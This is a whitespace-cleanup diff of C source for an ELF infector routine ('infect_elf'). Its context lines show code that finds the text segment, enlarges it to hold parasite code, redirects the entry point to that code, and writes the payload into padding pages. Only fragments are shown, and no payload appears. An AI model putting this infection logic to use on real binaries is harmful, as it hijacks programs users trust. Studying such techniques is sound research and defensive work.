@@ -124,7 +124,7 @@ int infect_elf(int fd, int fdout) {
     // read phdrs
     if ((phdr = malloc(ehdr.e_phnum * sizeof(Elf_Phdr))) == NULL)
         __FATAL("malloc");
-    
+
     if (lseek(fd, ehdr.e_phoff, SEEK_SET) == -1)
         __FATAL("lseek");
 
@@ -162,7 +162,7 @@ int infect_elf(int fd, int fdout) {
 
             // locate the next segment based on p_vaddr
             for (j=0; j<ehdr.e_phnum; j++)
-                if (phdr[j].p_vaddr >= phdr[i].p_vaddr + phdr[i].p_memsz 
+                if (phdr[j].p_vaddr >= phdr[i].p_vaddr + phdr[i].p_memsz
                     && (next_phdr == NULL || phdr[j].p_vaddr < next_phdr->p_vaddr))
                         next_phdr = &phdr[j];
 
@@ -195,7 +195,7 @@ int infect_elf(int fd, int fdout) {
                 nop = ((psz-padsz) + (PAGE_SIZE - (psz-padsz) % PAGE_SIZE))  / PAGE_SIZE;
             } else
                 nop = 0;
- 
+
             text_endoff = phdr[i].p_offset + phdr[i].p_filesz;
             // Modify the entry point of the ELF header to point to the new
             // code (p_vaddr + p_filesz)
@@ -214,7 +214,7 @@ int infect_elf(int fd, int fdout) {
             // Increase p_memsz to account for the new code (parasite)
             phdr[i].p_memsz += psz;
             for (j=0; j<ehdr.e_shnum; j++) { // find the last shdr in the text segment
-                if (phdr[i].p_vaddr <= shdr[j].sh_addr 
+                if (phdr[i].p_vaddr <= shdr[j].sh_addr
                         && phdr[i].p_vaddr + phdr[i].p_memsz > shdr[j].sh_addr
                         && (last_shdr == NULL || shdr[j].sh_addr > last_shdr->sh_addr))
                     last_shdr = &shdr[j];
@@ -236,7 +236,7 @@ int infect_elf(int fd, int fdout) {
             }
             break;
         }
-    
+
 
     if (i == ehdr.e_phnum) {
         fprintf(stderr, "[-] text segment not found\n");
@@ -305,7 +305,7 @@ int infect_elf(int fd, int fdout) {
                 __FATAL("write");
             pos += PAGE_SIZE;
         }
-        
+
         memset(buf, 0, PAGE_SIZE);
         memcpy(buf, code+pos, psz - pos);
 
@@ -343,7 +343,7 @@ int infect_elf(int fd, int fdout) {
     free(shdr);
     free(code);
     return 0;
-    
+
 _fatal:
     if (phdr != NULL)
         free(phdr);
